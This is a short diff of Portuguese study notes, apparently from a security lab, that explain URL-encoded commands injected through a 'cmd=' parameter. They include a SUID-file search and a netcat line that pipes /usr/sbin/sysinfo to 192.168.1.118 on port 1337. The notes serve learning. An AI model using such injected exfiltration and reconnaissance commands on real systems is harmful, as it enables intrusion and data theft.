@@ -221,10 +221,14 @@ cmd=find%20/%20-perm%20-4000
 
 ele está a ver quais os ficheiros/objetos com permissão s, aquilo que se falou nas aulas REVER
 
+https://www.tecmint.com/netcat-nc-command-examples/
 cmd=cat%20/usr/sbin/sysinfo%7Cnc%20-w%205%20192.168.1.118%201337
 nc é netcat, a flag - w está relacionada com o timeout que neste caso é de 5 segundos
 %7 representa |
-1337 é o número d porta
+1337 é o número da porta
+Pelos vistos a porta 1337 é conhecida por ser uma porta para malware?? HUMMMMMMM
+https://www.auditmypc.com/tcp-port-1337.asp
+THIS IS NOT GOING TO END WELL...
 
 
 
